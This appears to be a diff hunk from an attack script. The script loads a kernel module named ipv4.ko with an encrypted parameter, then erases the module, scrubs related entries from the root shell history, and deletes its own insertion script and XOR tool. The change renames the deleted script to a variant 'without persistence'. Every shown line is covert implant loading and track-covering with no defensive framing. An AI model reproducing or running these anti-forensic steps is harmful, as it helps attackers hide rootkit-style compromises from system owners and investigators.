@@ -21,6 +21,6 @@ insmod ipv4.ko param=$encrypted
 rm ipv4.ko
 sed -i '/ipv4/d' /root/.ash_history
 sed -i '/insertion/d' /root/.ash_history
-rm insertion_script
+rm insertion_script_without_persistence
 rm xor
 rm xor.c
